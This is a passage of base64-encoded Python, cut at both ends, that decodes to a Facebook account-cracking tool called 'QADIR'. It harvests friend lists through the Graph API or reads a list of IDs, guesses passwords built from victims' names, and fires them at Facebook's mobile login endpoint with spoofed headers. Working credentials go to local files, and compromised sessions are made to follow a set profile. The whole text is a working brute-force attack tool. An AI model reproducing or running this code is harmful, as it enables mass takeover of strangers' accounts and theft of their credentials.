ppcCwgZGVmbGF0ZSBiciIsImFjY2VwdC1sYW5ndWFnZSI6ImVuLUdCLGVuLVVTO3E9MC45LGVuO3E9MC44In0NCgkJCXBvID0gc2VzLnBvc3QoImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvdmFsaWRhdGUtcGFzc3dvcmQvP3NoYmw9MCIsIGRhdGEgPSBkYXRhYSwgaGVhZGVycz1faGVhZGVycywgYWxsb3dfcmVkaXJlY3RzID0gRmFsc2UpDQoJCQlpZiAnY191c2VyJyBpbiBzZXMuY29va2llcy5nZXRfZGljdCgpOg0KCQkJCXByaW50KCdcclwwMzNbMTszMm1bUUFESVItT0tdICVzIHwgJXMgICAgICAnICUgKHVzZXIscHcpKQ0KCQkJCXdydCA9ICclcyAtICVzJyAlICh1c2VyLHB3KQ0KCQkJCW9rLmFwcGVuZCh3cnQpDQoJCQkJb3BlbignUUFESVJfT2sudHh0JywnYScpLndyaXRlKCclc1xuJyAlIHdydCkNCgkJCQlicmVhaw0KCQkJZWxpZiAnY2hlY2twb2ludCcgaW4gc2VzLmNvb2tpZXMuZ2V0X2RpY3QoKToNCgkJCQl0cnk6DQoJCQkJCXRva2VuID0gYmF5bigndG9rZW4udHh0JykucmVhZCgpDQoJCQkJCWNwX3R0bCA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJXM/YWNjZXNzX3Rva2VuPSVzJyUodXNlcix0b2tlbikpLmpzb24oKVsnYmlydGhkYXknXQ0KCQkJCQltb250aCwgZGF5LCB5ZWFyID0gY3BfdHRsLnNwbGl0KCcvJykNCgkJCQkJbW9udGggPSBidWxhbl90dGxbbW9udGhdLnByaW50KCdcclwwMzNbMTs5MW1bUUFESVItQ1BdICVzIHwgJXMg4oCiICVzICVzICVzJXMgICAgICAnICUgKHVzZXIscHcsZGF5LG1vbnRoLHllYXIsdGFodW4odXNlcikpKQ0KCQkJCQl3cnQgPSAnJXMgLSAlcyAtICVzICVzICVzJXMnICUgKHVzZXIscHcsZGF5LG1vbnRoLHllYXIsdGFodW4odXNlcikpDQoJCQkJCWNwLmFwcGVuZCh3cnQpDQoJCQkJCW9wZW4oJ1FBRElSX0NwLnR4dCcsJ2EnKS53cml0ZSgnJXNcbicgJSB3cnQpDQoJCQkJCWJyZWFrDQoJCQkJZXhjZXB0IChLZXlFcnJvciwgSU9FcnJvcik6DQoJCQkJCW1vbnRoID0gJycNCgkJCQkJZGF5ICAgPSAnJw0KCQkJCQl5ZWFyICA9ICcnDQoJCQkJZXhjZXB0Og0KCQkJCQlwYXNzDQoJCQkJcHJpbnQoJ1xyXDAzM1sxOzkxbVtRQURJUi1DUF0gJXMgfCAlcyVzICAgICAgJyAlICh1c2VyLHB3LHRhaHVuKHVzZXIpKSkNCgkJCQl3cnQgPSAnJXMgLSAlcyVzJyUodXNlcixwdyx0YWh1bih1c2VyKSkNCgkJCQljcC5hcHBlbmQod3J0KQ0KCQkJCW9wZW4oJ1FBRElSX0NwLnR4dCcsJ2EnKS53cml0ZSgnJXNcbicgJSB3cnQpDQoJCQkJYnJlYWsNCgkJCWVsc2U6DQoJCQkJY29udGludWUNCgkJbG9vcCArPSAxDQoJZGVmIF9fcGxlcl9fKHNlbGYpOg0KCQlvcy5zeXN0ZW0oImNsZWFyIikNCgkJcHJpbnQoYmFubmVyKQ0KCQlwcmludCAoIlwwMzNbMTszMm0gWzFdIFwwMzNbMTszM21NZXRob2QgRmFzdCAiKQ0KCQlwcmludCAoIlwwMzNbMTszMm0gWzJdIFwwMzNbMTszM21NZXRob2QgTm9ybWFsICIpDQoJCXByaW50ICgiXDAzM1sxOzMybSBbM10gXDAzM1sxOzMzbU1ldGhvZCBNZWRpdW0gIikNCgkJcHJpbnQoNTQqIl8iKQ0KCQlwcmludCgiIikNCgkJeWFuID0gaW5wdXQoJ0Nob29zZSBtZXRob2QgOiAnKQ0KCQlpZiB5YW4gPT0gJyc6DQoJCQlwcmludCgnXENob29zZSBFcnJvciAnKQ0KCQkJZXhpdCgpDQoJCWVsaWYgeWFuIGluICgnMScsICcwMScpOg0KCQkJb3Muc3lzdGVtKCJjbGVhciIpDQoJCQlwcmludChiYW5uZXIpDQoJCQl0aW1lLnNsZWVwKDEpDQoJCQlwcmludCgnXDAzM1sxOzMzbSBUb3RhbCBJZHogOiBcMDMzWzE7MzJtJXMgJyAlIGxlbihzZWxmLmlkKSkNCgkJCXByaW50KCdcMDMzWzE7MzNtIEJydXRlIEhhcyBiZWVuIHN0YXJ0ZWQnKQ0KCQkJcHJpbnQoNTQqIl8iKQ0KCQkJcHJpbnQoIiIpDQoJCQlwcmludCgnICAgICAgW1wwMzNbMTs5N21cMDMzWzE7NDFtICBVc2UgQWlycGxhbmUgbW9kZSBGb3IgU3BlZWR1cCBDbG9uaW5nICBcMDMzWzBtXDAzM1sxOzkzbV0nKQ0KCQkJcHJpbnQoNTQqIl8iKQ0KCQkJcHJpbnQoIiIpDQoJCQl3aXRoIFRocmVhZFBvb2xFeGVjdXRvcihtYXhfd29ya2Vycz0yMCkgYXMgKF9uZ2VudG90X2dyYXRpc18pOg0KCQkJCWZvciB5bnRrdHMgaW4gc2VsZi5pZDoNCgkJCQkJdHJ5Og0KCQkJCQkJdWlkLCBuYW1lID0geW50a3RzLnNwbGl0KCd8JykNCgkJCQkJCXh6ID0gbmFtZS5zcGxpdCgnICcpDQoJCQkJCQlmaSAsIGxhID0gbmFtZS5zcGxpdCgnICcpDQoJCQkJCQlmaXJzdCA9IGZpLmxvd2VyKCkNCgkJCQkJCWxhc3QgPSBsYS5sb3dlcigpDQoJCQkJCQlpZiBsZW4oeHopID09IDE6DQoJCQkJCQkJcHd4ID0gW2ZpcnN0KycgJytsYXN0LCBmaXJzdCtsYXN0LCBmaXJzdCsnMTIzJywgZmlyc3QrJzEyMzQ1J10NCgkJCQkJCWVsaWYgbGVuKHh6KSA9PSAyOg0KCQkJCQkJCXB3eCA9IFtmaXJzdCsnICcrbGFzdCwgZmlyc3QrbGFzdCwgZmlyc3QrJzEyMycsIGZpcnN0KycxMjM0NSddDQoJCQkJCQllbGlmIGxlbih4eikgPT0gMzoNCgkJCQkJCQlwd3ggPSBbZmlyc3QrJyAnK2xhc3QsIGZpcnN0K2xhc3QsIGZpcnN0KycxMjMnLCBmaXJzdCsnMTIzNDUnXQ0KCQkJCQkJZWxpZiBsZW4oeHopID09IDQ6DQoJCQkJCQkJcHd4ID0gW2ZpcnN0KycgJytsYXN0LCBmaXJzdCtsYXN0LCBmaXJzdCsnMTIzJywgZmlyc3QrJzEyMzQ1J10NCgkJCQkJCWVsc2U6DQoJCQkJCQkJcHd4ID0gW2ZpcnN0KycgJytsYXN0LCBmaXJzdCtsYXN0LCBmaXJzdCsnMTIzJywgZmlyc3QrJzEyMzQ1J10NCgkJCQkJCV9uZ2VudG90X2dyYXRpc18uc3VibWl0KHNlbGYuX19tYmFzaWNfXywgdWlkLCBwd3gpDQoJCQkJCWV4Y2VwdDoNCgkJCQkJCXBhc3MNCgkJCW9zLnJlbW92ZShzZWxmLmFwaykNCgkJCWhhc2lsKG9rLGNwKQ0KCQllbGlmIHlhbiBpbiAoJzInLCAnMDInKToNCgkJCW9zLnN5c3RlbSgiY2xlYXIiKQ0KCQkJcHJpbnQoYmFubmVyKQ0KCQkJdGltZS5zbGVlcCgxKQ0KCQkJcHJpbnQoJ1wwMzNbMTszM20gVG90YWwgSWR6IDogXDAzM1sxOzMybSVzICcgJSBsZW4oc2VsZi5pZCkpDQoJCQlwcmludCgnXDAzM1sxOzMzbSBCcnV0ZSBIYXMgYmVlbiBzdGFydGVkJykNCgkJCXByaW50KDU0KiJfIikNCgkJCXByaW50KCIiKQ0KCQkJcHJpbnQoJyAgICAgIFtcMDMzWzE7OTdtXDAzM1sxOzQxbSAgVXNlIEFpcnBsYW5lIG1vZGUgRm9yIFNwZWVkdXAgQ2xvbmluZyAgXDAzM1swbVwwMzNbMTs5M21dJykNCgkJCXByaW50KDU0KiJfIikNCgkJCXByaW50KCIiKQ0KCQkJd2l0aCBUaHJlYWRQb29sRXhlY3V0b3IobWF4X3dvcmtlcnM9MjUpIGFzIChfbmdlbnRvdF9ncmF0aXNfKToNCgkJCQlmb3IgeW50a3RzIGluIHNlbGYuaWQ6DQoJCQkJCXRyeToNCgkJCQkJCXVpZCwgbmFtZSA9IHludGt0cy5zcGxpdCgnfCcpDQoJCQkJCQl4eiA9IG5hbWUuc3BsaXQoJyAnKQ0KCQkJCQkJaWYgbGVuKHh6KSA9PSAxOg0KCQkJCQkJCXB3eCA9IFtuYW1lLCB4elswXSsiMTIzIiwgeHpbMF0rIjEyMzQiLCB4elswXSsiNzg2IiwgeHpbMF0rIjEyMzQ1Il0NCgkJCQkJCWVsaWYgbGVuKHh6KSA9PSAyOg0KCQkJCQkJCXB3eCA9IFtuYW1lLCB4elswXSsiMTIzIiwgeHpbMF0rIjEyMzQiLCB4elswXSsiNzg2IiwgeHpbMF0rIjEyMzQ1Il0NCgkJCQkJCWVsaWYgbGVuKHh6KSA9PSAzOg0KCQkJCQkJCXB3eCA9IFtuYW1lLCB4elswXSsiMTIzIiwgeHpbMF0rIjEyMzQiLCB4elswXSsiNzg2IiwgeHpbMF0rIjEyMzQ1Il0NCgkJCQkJCWVsaWYgbGVuKHh6KSA9PSA0Og0KCQkJCQkJCXB3eCA9IFtuYW1lLCB4elswXSsiMTIzIiwgeHpbMF0rIjEyMzQiLCB4elswXSsiNzg2IiwgeHpbMF0rIjEyMzQ1Il0NCgkJCQkJCWVsc2U6DQoJCQkJCQkJcHd4ID0gW25hbWUsIHh6WzBdKyIxMjMiLCB4elswXSsiMTIzNCIsIHh6WzBdKyI3ODYiLCB4elswXSsiMTIzNDUiXQ0KCQkJCQkJX25nZW50b3RfZ3JhdGlzXy5zdWJtaXQoc2VsZi5fX21iYXNpY19fLCB1aWQsIHB3eCkNCgkJCQkJZXhjZXB0Og0KCQkJCQkJcGFzcw0KCQkJb3MucmVtb3ZlKHNlbGYuYXBrKQ0KCQkJaGFzaWwob2ssY3ApDQoJCWVsaWYgeWFuIGluICgnMycsICcwMycpOg0KCQkJb3Muc3lzdGVtKCJjbGVhciIpDQoJCQlwcmludChiYW5uZXIpDQoJCQl0aW1lLnNsZWVwKDEpDQoJCQlwcmludCgnXDAzM1sxOzMzbSBUb3RhbCBJZHogOiBcMDMzWzE7MzJtJXMgJyAlIGxlbihzZWxmLmlkKSkNCgkJCXByaW50KCdcMDMzWzE7MzNtIEJydXRlIEhhcyBiZWVuIHN0YXJ0ZWQnKQ0KCQkJcHJpbnQoNTQqIl8iKQ0KCQkJcHJpbnQoIiIpDQoJCQlwcmludCgnICAgICAgW1wwMzNbMTs5N21cMDMzWzE7NDFtICBVc2UgQWlycGxhbmUgbW9kZSBGb3IgU3BlZWR1cCBDbG9uaW5nICBcMDMzWzBtXDAzM1sxOzkzbV0nKQ0KCQkJcHJpbnQoNTQqIl8iKQ0KCQkJcHJpbnQoIiIpDQoJCQl3aXRoIFRocmVhZFBvb2xFeGVjdXRvcihtYXhfd29ya2Vycz0zNSkgYXMgKF9uZ2VudG90X2dyYXRpc18pOg0KCQkJCWZvciB5bnRrdHMgaW4gc2VsZi5pZDoNCgkJCQkJdHJ5Og0KCQkJCQkJdWlkLCBuYW1lID0geW50a3RzLnNwbGl0KCd8JykNCgkJCQkJCXh6ID0gbmFtZS5zcGxpdCgnICcpDQoJCQkJCQlpZiBsZW4oeHopID09IDE6DQoJCQkJCQkJcHd4ID0gW25hbWUsIHh6WzBdK3h6WzFdLCB4elsxXSt4elswXSwgeHpbMF0rIjEyMyIsIHh6WzBdKyIxMjM0IiwgeHpbMF0rIjEyMzQ1Il0NCgkJCQkJCWVsaWYgbGVuKHh6KSA9PSAyOg0KCQkJCQkJCXB3eCA9IFtuYW1lLCB4elswXSt4elsxXSwgeHpbMV0reHpbMF0sIHh6WzBdKyIxMjMiLCB4elswXSsiMTIzNCIsIHh6WzBdKyIxMjM0NSJdDQoJCQkJCQllbGlmIGxlbih4eikgPT0gMzoNCgkJCQkJCQlwd3ggPSBbbmFtZSwgeHpbMF0reHpbMV0sIHh6WzFdK3h6WzBdLCB4elswXSsiMTIzIiwgeHpbMF0rIjEyMzQiLCB4elswXSsiMTIzNDUiXQ0KCQkJCQkJZWxpZiBsZW4oeHopID09IDQ6DQoJCQkJCQkJcHd4ID0gW25hbWUsIHh6WzBdK3h6WzFdLCB4elsxXSt4elswXSwgeHpbMF0rIjEyMyIsIHh6WzBdKyIxMjM0IiwgeHpbMF0rIjEyMzQ1Il0NCgkJCQkJCWVsc2U6DQoJCQkJCQkJcHd4ID0gW25hbWUsIHh6WzBdK3h6WzFdLCB4elsxXSt4elswXSwgeHpbMF0rIjEyMyIsIHh6WzBdKyIxMjM0IiwgeHpbMF0rIjEyMzQ1Il0NCgkJCQkJCV9uZ2VudG90X2dyYXRpc18uc3VibWl0KHNlbGYuX19tYmFzaWNfXywgdWlkLCBwd3gpDQoJCQkJCWV4Y2VwdDoNCgkJCQkJCQlwYXNzDQoJCQlvcy5yZW1vdmUoc2VsZi5hcGspDQoJCQloYXNpbChvayxjcCkNCgkJZWxzZToNCgkJCXByaW50KCdcblNhbGFoJykNCgkJCXRpbWUuc2xlZXAoMSkNCgkJCXNlbGYuX19wbGVyX18oKQ0KCQkJDQpjbGFzcyBfX3h4eF9fOg0KICAgIGRlZiBfX2luaXRfXyhzZWxmKToNCiAgICAgICAgc2VsZi5pZCA9IFtdDQogICAgZGVmIFFBRElSeChzZWxmLGlkKToNCiAgICAgICAgb3Muc3lzdGVtKCJjbGVhciIpO3ByaW50KGJhbm5lcikNCiAgICAgICAgc2VsZi5jbnQgPSBpbnB1dCgnWytdIEZpbGUgUGF0aCA6ICcpDQogICAgICAgIHNlbGYuaWQgPSBvcGVuKHNlbGYuY250KS5yZWFkKCkuc3BsaXRsaW5lcygpDQogICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQ0KICAgICAgICBwcmludChiYW5uZXIpDQogICAgICAgIHByaW50KCIiKQ0KICAgICAgICBfX193b3JsZHdpZGVfX18gPSAoJ3knKQ0KICAgICAgICBpZiBfX193b3JsZHdpZGVfX18gaW4gKCd5ZXMnLCdZZXMnLCdZJywgJ3knKToNCiAgICAgICAgICAgIHNlbGYuX19wbGVyX18oKQ0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgcHJpbnQoJyBbIV0gQ2hvb3NlIENvcnJlY3QgT25lJyk7DQogICAgICAgICAgICBzZWxmLlFBRElSeChpZCkNCiAgICBkZWYgX19tZXRvZGVfXyhzZWxmLCB1c2VyLCBfX2NoaV9fLCBjZWJvayk6DQogICAgICAgIGdsb2JhbCBvayxjcCxsb29wDQogICAgICAgIHN5cy5zdGRvdXQud3JpdGUoZiJcciBceDFiWzE7OTJtW1FBRElSXSB7bG9vcH0ve2xlbihzZWxmLmlkKX0gT0ste2xlbihvayl9XSBDUC17bGVuKGNwKX1dICIpDQogICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQ0KICAgICAgICB0cnk6DQogICAgICAgICAgICBmb3IgcHcgaW4gX19jaGlfXzoNCiAgICAgICAgICAgICAgICBwdyA9IHB3Lmxvd2VyKCkNCiAgICAgICAgICAgICAgICBzZXNzaW9uPXJlcXVlc3RzLlNlc3Npb24oKQ0KICAgICAgICAgICAgICAgIGhlYWRlciA9IHsNCiAgICAgICAgICAgICAgICAgICAgIkhvc3QiOmNlYm9rLA0KICAgICAgICAgICAgICAgICAgICAidXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyI6IjEiLA0KICAgICAgICAgICAgICAgICAgICAidXNlci1hZ2VudCI6Ik5va2lhQzMtMDAvNS4wICgwOC42MykgUHJvZmlsZS9NSURQLTIuMSBDb25maWd1cmF0aW9uL0NMREMtMS4xIE1vemlsbGEvNS4wIEFwcGxlV2ViS2l0LzQyMCsgKEtIVE1MLCBsaWtlIEdlY2tvKSBTYWZhcmkvNDIwKyIsDQogICAgICAgICAgICAgICAgICAgICJhY2NlcHQiOiJ0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjkiLA0KICAgICAgICAgICAgICAgICAgICAiZG50IjoiMSIsDQogICAgICAgICAgICAgICAgICAgICJ4LXJlcXVlc3RlZC13aXRoIjoibWFyay52aWEuZ3AiLA0KICAgICAgICAgICAgICAgICAgICAic2VjLWZldGNoLXNpdGUiOiJzYW1lLW9yaWdpbiIsDQogICAgICAgICAgICAgICAgICAgICJzZWMtZmV0Y2gtbW9kZSI6ImNvcnMiLA0KICAgICAgICAgICAgICAgICAgICAic2VjLWZldGNoLXVzZXIiOiJlbXB0eSIsDQogICAgICAgICAgICAgICAgICAgICJzZWMtZmV0Y2gtZGVzdCI6ImRvY3VtZW50IiwNCiAgICAgICAgICAgICAgICAgICAgInJlZmVyZXIiOiJodHRwczovL20uZmFjZWJvb2suY29tLyIsDQogICAgICAgICAgICAgICAgICAgICJhY2NlcHQtZW5jb2RpbmciOiJnemlwLCBkZWZsYXRlIGJyIiwNCiAgICAgICAgICAgICAgICAgICAgImFjY2VwdC1sYW5ndWFnZSI6ImVuLUdCLGVuLVVTO3E9MC45LGVuO3E9MC44Ig0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICByID0gc2Vzc2lvbi5nZXQoZiJodHRwczovL3tjZWJva30vaW5kZXgucGhwP25leHQ9aHR0cHMlM0ElMkYlMkZkZXZlbG9wZXJzLmZhY2Vib29rLmNvbSUyRnRvb2xzJTJGZGVidWclMkZhY2Nlc3N0b2tlbiUyRiIsIGhlYWRlcnM9aGVhZGVyKQ0KICAgICAgICAgICAgICAgIGRhcyA9IHsNCiAgICAgICAgICAgICAgICAgICAgImxzZCI6cmUuc2VhcmNoKCduYW1lPSJsc2QiIHZhbHVlPSIoLio/KSInLCBzdHIoci50ZXh0KSkuZ3JvdXAoMSksDQogICAgICAgICAgICAgICAgICAgICJqYXpvZXN0IjpyZS5zZWFyY2goJ25hbWU9Imphem9lc3QiIHZhbHVlPSIoLio/KSInLCBzdHIoci50ZXh0KSkuZ3JvdXAoMSksDQogICAgICAgICAgICAgICAgICAgICJ1aWQiOnVzZXIsDQogICAgICAgICAgICAgICAgICAgICJmbG93IjoibG9naW5fbm9fcGluIiwNCiAgICAgICAgICAgICAgICAgICAgInBhc3MiOnB3LA0KICAgICAgICAgICAgICAgICAgICAibmV4dCI6Imh0dHBzOi8vZGV2ZWxvcGVycy5mYWNlYm9vay5jb20vdG9vbHMvZGVidWcvYWNjZXNzdG9rZW4vIg0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBoZWFkZXIxID0gew0KICAgICAgICAgICAgICAgICAgICAiSG9zdCI6Y2Vib2ssDQogICAgICAgICAgICAgICAgICAgICJjYWNoZS1jb250cm9sIjoibWF4LWFnZT0wIiwNCiAgICAgICAgICAgICAgICAgICAgInVwZ3JhZGUtaW5zZWN1cmUtcmVxdWVzdHMiOiIxIiwNCiAgICAgICAgICAgICAgICAgICAgIm9yaWdpbiI6Imh0dHBzOi8vIitjZWJvaywNCiAgICAgICAgICAgICAgICAgICAgImNvbnRlbnQtdHlwZSI6ImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIsDQogICAgICAgICAgICAgICAgICAgICJ1c2VyLWFnZW50IjoiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEyOyBTQU1TVU5HIFNNLUc3ODBHKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBTYW1zdW5nQnJvd3Nlci8xNi4wIENocm9tZS85Mi4wLjQ1MTUuMTY2IE1vYmlsZSBTYWZhcmkvNTM3LjM2IiwNCiAgICAgICAgICAgICAgICAgICAgImFjY2VwdCI6InRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMztxPTAuOSIsDQogICAgICAgICAgICAgICAgICAgICJ4LXJlcXVlc3RlZC13aXRoIjoiWE1MSHR0cFJlcXVlc3QiLA0KICAgICAgICAgICAgICAgICAgICAic2VjLWZldGNoLXNpdGUiOiJzYW1lLW9yaWdpbiIsDQogICAgICAgICAgICAgICAgICAgICJzZWMtZmV0Y2gtbW9kZSI6ImNvcnMiLA0KICAgICAgICAgICAgICAgICAgICAic2VjLWZldGNoLXVzZXIiOiJlbXB0eSIsDQogICAgICAgICAgICAgICAgICAgICJzZWMtZmV0Y2gtZGVzdCI6ImRvY3VtZW50IiwNCiAgICAgICAgICAgICAgICAgICAgInJlZmVyZXIiOiJodHRwczovLyIrY2Vib2srIi9pbmRleC5waHA/bmV4dD1odHRwcyUzQSUyRiUyRmRldmVsb3BlcnMuZmFjZWJvb2suY29tJTJGdG9vbHMlMkZkZWJ1ZyUyRmFjY2Vzc3Rva2VuJTJGIiwNCiAgICAgICAgICAgICAgICAgICAgImFjY2VwdC1lbmNvZGluZyI6Imd6aXAsIGRlZmxhdGUgYnIiLA0KICAgICAgICAgICAgICAgICAgICAiYWNjZXB0LWxhbmd1YWdlIjoiZW4tR0IsZW4tVVM7cT0wLjksZW47cT0wLjgiDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIHBvID0gc2Vzc2lvbi5wb3N0KGYiaHR0cHM6Ly97Y2Vib2t9L2xvZ2luL2RldmljZS1iYXNlZC92YWxpZGF0ZS1wYXNzd29yZC8/c2hibD0wIiwgZGF0YSA9IGRhcywgaGVhZGVycyA9IGhlYWRlcjEsIGFsbG93X3JlZGlyZWN0cyA9IEZhbHNlKQ0KICAgICAgICAgICAgICAgIGlmICdjX3VzZXInIGluIHNlc3Npb24uY29va2llcy5nZXRfZGljdCgpOg0KICAgICAgICAgICAgICAgICAgICBjb2tpPSI7Ii5qb2luKFtrZXkrIj0iK3ZhbHVlIGZvciBrZXksdmFsdWUgaW4gc2Vzc2lvbi5jb29raWVzLmdldF9kaWN0KCkuaXRlbXMoKV0pDQogICAgICAgICAgICAgICAgICAgIHByaW50KGYiXHJ7SH0gW1FBRElSLU9LXSB7dXNlcn0gfCB7cHd9IikNCiAgICAgICAgICAgICAgICAgICAgd3J0ID0gJyVzfCVzJyAlICh1c2VyLHB3KQ0KICAgICAgICAgICAgICAgICAgICBvay5hcHBlbmQod3J0KQ0KICAgICAgICAgICAgICAgICAgICBvcGVuKCdRQURJUl9Pay50eHQnICwgJ2EnKS53cml0ZSgnJXNcbicgJSB3cnQpDQogICAgICAgICAgICAgICAgICAgIHNlbGYuZm9sbG93KHNlc3Npb24sY29raSkNCiAgICAgICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICBjb250aW51ZQ0KICAgICAgICAgICAgbG9vcCs9MQ0KICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICBzZWxmLl9fbWV0b2RlX18odXNlciwgcHcsIGNlYm9rKQ0KDQogICAgZGVmIGZvbGxvdyhzZWxmLCBzZXNzaW9uLCBjb2tpKToNCiAgICAgICAgciA9IEJlYXV0aWZ1bFNvdXAoc2Vzc2lvbi5nZXQoJ2h0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9wcm9maWxlLnBocD9pZD0xMDAwMTc1NjU5NDQ1NjcnLCBjb29raWVzPXsnY29va2llJzogY29raX0pLnRleHQsICdodG1sLnBhcnNlcicpDQogICAgICAgIGdldCA9IHIuZmluZCgnYScsIHN0cmluZz0nSWt1dGknKS5nZXQoJ2hyZWYnKQ0KICAgICAgICBzZXNzaW9uLmdldCgoJ2h0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbScgKyBzdHIoZ2V0KSksIGNvb2tpZXM9eydjb29raWUnOiBjb2tpfSkudGV4dA0KDQogICAgZGVmIF9fcGxlcl9fKHNlbGYpOg0KICAgICAgICAgICAgb3Muc3lzdGVtKCJjbGVhciIpDQogICAgICAgICAgICBwcmludChiYW5uZXIpDQogICAgICAgICAgICBwcmludCgnXDAzM1sxOzMzbSBUb3RhbCBJZHogOiBcMDMzWzE7MzJtJXMgJyAlIGxlbihzZWxmLmlkKSkNCiAgICAgICAgICAgIHByaW50KCdcMDMzWzE7MzNtIEJydXRlIEhhcyBiZWVuIHN0YXJ0ZWQnKQ0KICAgICAgICAgICAgcHJpbnQoNTQqIl8iKQ0KICAgICAgICAgICAgcHJpbnQoIiIpDQogICAgICAgICAgICBwcmludCgiICAgICAgW1wwMzNbMTs5N21cMDMzWzE7NDFtICBVc2UgQWlycGxhbmUgbW9kZSBGb3IgU3BlZWR1cCBDbG9uaW5nICBcMDMzWzBtXDAzM1sxOzkzbV0iKQ0KICAgICAgICAgICAgcHJpbnQoNTQqIl8iKQ0KICAgICAgICAgICAgcHJpbnQoIiIpDQogICAgICAgICAgICB3aXRoIFFBRElSYWJiYShtYXhfd29ya2Vycz0zMCkgYXMgUUFESVI6DQogICAgICAgICAgICAgICAgZm9yIHpzYiBpbiBzZWxmLmlkOiAjIFlvIE5kYWsgVGF1IEtvayBUYW55YSBTYWlhDQogICAgICAgICAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICAgICAgICAgIHVpZCwgbmFtZSA9IHpzYi5zcGxpdCgnfCcpDQogICAgICAgICAgICAgICAgICAgICAgICB4eiA9IG5hbWUuc3BsaXQoJyAnKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZmlyc3QsIGxhc3QgPSBuYW1lLnNwbGl0KCcgJykNCiAgICAgICAgICAgICAgICAgICAgICAgIGZpcnN0bCA9IGZpcnN0Lmxvd2VyKCkNCiAgICAgICAgICAgICAgICAgICAgICAgIGxhc3RsID0gbGFzdC5sb3dlcigpDQogICAgICAgICAgICAgICAgICAgICAgICBmaXJzdHMgPSBmaXJzdC50aXRsZSgpDQogICAgICAgICAgICAgICAgICAgICAgICBsYXN0cyA9IGxhc3QudGl0bGUoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgbGVuKHh6KSA9PSAzIG9yIGxlbih4eikgPT0gNCBvciBsZW4oeHopID09IDUgb3IgbGVuKHh6KSA9PSA2Og0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHB3eCA9IFtmaXJzdGwrJyAnK2xhc3RsLGZpcnN0bCtsYXN0bCwgZmlyc3QrIjEyMyIsIGZpcnN0KyIxMjM0NSJdDQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHB3eCA9IFtmaXJzdGwrJyAnK2xhc3RsLGZpcnN0bCtsYXN0bCwgZmlyc3QrIjEyMyIsIGZpcnN0KyIxMjM0NSJdDQogICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgIFFBRElSLnN1Ym1pdChzZWxmLl9fbWV0b2RlX18sIHVpZCwgcHd4LCAibWJhc2ljLmZhY2Vib29rLmNvbSIpDQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdDoNCiAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MNCiAgICAgICAgICAgIGhhc2lsKG9rLGNwKQ0KDQpjbGFzcyBfX3hueF9fOg0KICAgIGRlZiBfX2luaXRfXyhzZWxmKToNCiAgICAgICAgc2VsZi5pZCA9IFtdDQogICAgICAgIGlkID0gW10NCiAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKCJhY2Nlc3NfdG9rZW4udHh0Iik6DQogICAgICAgICAgICBsb2dpbigpDQogICAgICAgIA0KICAgIGRlZiBRQURJUngoc2VsZixpZCk6DQogICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKTtwcmludChiYW5uZXIpDQogICAgICAgIGFjY2Vzc190b2tlbiA9IG9wZW4oJ2FjY2Vzc190b2tlbi50eHQnLCAncicpLnJlYWQoKQ0KICAgICAgICB0cnk6DQogICAgICAgICAgICBsaW1pdF91c2VyID0gMQ0KICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICBsaW1pdF91c2VyID0gMQ0KICAgICAgICBjb3VudCA9IDANCiAgICAgICAgZm9yIGZpciBpbiByYW5nZShsaW1pdF91c2VyKToNCiAgICAgICAgICAgIGNvdW50ICs9MQ0KICAgICAgICAgICAgc2VsZi5jbnQgPSBpbnB1dCgnIFslc10gSWQ6ICclKGNvdW50KSkNCiAgICAgICAgZm9yIGEgaW4gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8lcy9mcmllbmRzP2xpbWl0PTUwMDAmYWNjZXNzX3Rva2VuPSVzJyUoc2VsZi5jbnQsYWNjZXNzX3Rva2VuKSkuanNvbigpWyJkYXRhIl06DQogICAgICAgICAgICBpZC5hcHBlbmQoYVsnaWQnXSArICd8JyArIGFbJ25hbWUnXSkNCiAgICAgICAgc2VsZi5pZCA9IGlkDQogICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQ0KICAgICAgICBwcmludChiYW5uZXIpDQogICAgICAgIHByaW50KCIiKQ0KICAgICAgICBfX193b3JsZHdpZGVfX18gPSAoJ3knKQ0KICAgICAgICBpZiBfX